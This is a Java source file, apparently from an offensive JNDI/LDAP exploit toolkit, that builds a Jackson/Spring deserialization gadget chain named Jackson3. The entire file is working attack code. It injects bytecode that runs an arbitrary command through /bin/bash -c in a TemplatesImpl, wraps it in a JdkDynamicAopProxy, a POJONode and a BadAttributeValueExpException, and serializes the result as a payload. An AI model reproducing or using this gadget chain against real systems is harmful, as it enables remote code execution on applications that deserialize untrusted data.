package com.feihong.ldap.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import org.springframework.aop.AfterAdvice;
import org.springframework.aop.MethodBeforeAdvice;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.ThrowsAdviceInterceptor;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;

// from https://wx.zsxq.com/dweb2/index/topic_detail/188424148425222
public class Jackson3 {
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
//        System.out.println(type);
//        System.out.println(param[0]);

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        if(writeReplace !=null) {
            ctClass0.removeMethod(writeReplace);
        }
        ctClass0.toClass();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
//        constructor.setBody("Runtime.getRuntime().exec(\"" + param[0] + "\");");
        constructor.setBody("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"" + param[0] + "\"});");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();


        Templates templatesImpl = new TemplatesImpl();
        Reflections.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        Reflections.setFieldValue(templatesImpl, "_name", "test");
        Reflections.setFieldValue(templatesImpl, "_tfactory", null);

        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        // 不知道为啥，本来就是public的。不写就报错：Class com.feihong.ldap.gadgets.Jackson3 can not access a member of class org.springframework.aop.framework.JdkDynamicAopProxy with modifiers "public"
        cons.setAccessible(true);


        MethodBeforeAdvice methodBeforeAdvice = (method, args, target) -> System.out.println("Before method: " + method.getName());

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        // 不加一个advice就总是报空指针异常
        advisedSupport.addAdvice(methodBeforeAdvice);

        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);

        return object2Bytes(exp);
    }


    private static byte[] object2Bytes(Object obj) throws IOException {
        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(obj);
        byte[] bytes = baous.toByteArray();
        oos.close();
        return bytes;
    }
}
